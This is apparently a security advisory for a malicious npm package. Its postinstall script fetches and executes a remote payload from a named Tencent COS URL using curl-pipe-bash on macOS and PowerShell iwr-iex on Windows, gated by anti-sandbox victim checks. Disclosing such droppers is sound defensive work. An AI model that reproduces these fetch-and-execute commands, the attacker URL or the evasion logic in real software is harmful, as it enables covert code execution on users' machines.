summary: postinstall dropper fetches and executes remote payload from Tencent COS bucket
details: scripts/postinstall.js runs automatically during npm install and performs a targeted fetch-and-execute against a hardcoded URL: https://mexc-1258433570.cos.ap-beijing.myqcloud.com/abi-tool-damon. On macOS the payload is delivered via `curl -fsSL <URL> | bash`; on Windows via PowerShell `iwr <URL> | iex`. Delivery is gated on a victim-selection filter that requires the host to be macOS or Windows AND to have Lark/Feishu installed AND FortiClient installed, otherwise the script exits silently — an explicit anti-sandbox targeting pattern (a comment describes this as `反沙箱`). Errors are swallowed so npm install completes cleanly. The fetched bytes are unverified, not pinned by hash or signature, and are executed with the privileges of the user running npm install. The declared package purpose (ABI tools) has no legitimate need to download and shell-execute an opaque remote binary on install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
